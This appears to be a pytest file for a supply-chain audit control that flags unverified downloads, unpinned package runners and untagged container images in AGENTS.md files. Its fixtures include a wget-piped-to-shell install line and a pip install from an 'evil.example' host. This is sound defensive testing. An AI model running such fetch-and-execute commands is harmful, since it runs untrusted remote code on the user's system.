from __future__ import annotations

from typing import TYPE_CHECKING

from acb.controls.acb_gen_002 import AUDITS
from tests._harness import context_for
from tests.test_controls._shared import check_pass_and_fail

if TYPE_CHECKING:
    from pathlib import Path

    from acb.model import Finding


def test_acb_gen_002_fixtures() -> None:
    check_pass_and_fail("ACB-GEN-002", AUDITS)


def _downloads(tmp_path: Path, text: str) -> list[Finding]:
    (tmp_path / "AGENTS.md").write_text(text)
    return AUDITS["downloads-verified"](context_for(tmp_path))


def test_citation_links_are_not_fetches(tmp_path: Path) -> None:
    assert _downloads(tmp_path, "See the [spec](https://agentskills.io/specification).\n") == []


def test_fetch_command_url_is_checked(tmp_path: Path) -> None:
    assert _downloads(tmp_path, "curl -o tool https://example.com/releases/latest/tool\n")


def test_continued_fetch_command_reports_the_url_line(tmp_path: Path) -> None:
    findings = _downloads(tmp_path, "intro\ncurl -fsSL \\\n  https://example.com/x/tool -o tool\n")
    assert [f.line for f in findings] == [3]


def test_link_to_a_script_is_a_download(tmp_path: Path) -> None:
    assert _downloads(tmp_path, "Run [the installer](https://example.com/install.sh).\n")


def _runners(tmp_path: Path, text: str) -> list[Finding]:
    (tmp_path / "AGENTS.md").write_text(text)
    return AUDITS["package-runners-pinned"](context_for(tmp_path))


def test_yaml_list_of_tool_names_is_not_an_invocation(tmp_path: Path) -> None:
    assert _runners(tmp_path, "tools:\n  - uvx\n  - zizmor\n") == []


def test_pip_requirements_file_and_trailing_prose_are_not_packages(tmp_path: Path) -> None:
    assert _runners(tmp_path, "Run `pip install -r requirements.txt`, `make`, a test suite, a linter.\n") == []


def test_prose_and_python_imports_are_not_images(tmp_path: Path) -> None:
    (tmp_path / "AGENTS.md").write_text("image: a hardened base\nfrom ruamel.yaml import YAML\n")
    assert AUDITS["images-by-digest"](context_for(tmp_path)) == []


def test_line_continued_docker_run_resolves_the_image(tmp_path: Path) -> None:
    (tmp_path / "AGENTS.md").write_text('docker run --rm -v "$PWD:/repo" \\\n  -w /repo ghcr.io/o/i:latest\n')
    findings = AUDITS["images-by-digest"](context_for(tmp_path))
    assert [f.message.endswith("'ghcr.io/o/i:latest'") for f in findings] == [True]


def test_a_citation_mentioning_a_tool_name_is_not_a_fetch(tmp_path: Path) -> None:
    assert _downloads(tmp_path, "See [the post](https://astral.sh/blog/uv-audit) for details.\n") == []


def test_urls_in_a_fenced_block_are_fetches(tmp_path: Path) -> None:
    assert _downloads(tmp_path, "Run:\n\n```sh\nsh <(wget -qO- https://get.example.com/install)\n```\n")
    assert _downloads(tmp_path, "```\nURL=https://get.example.com/install\n```\n")
    assert _downloads(tmp_path, "pip install https://evil.example/pkg\n")
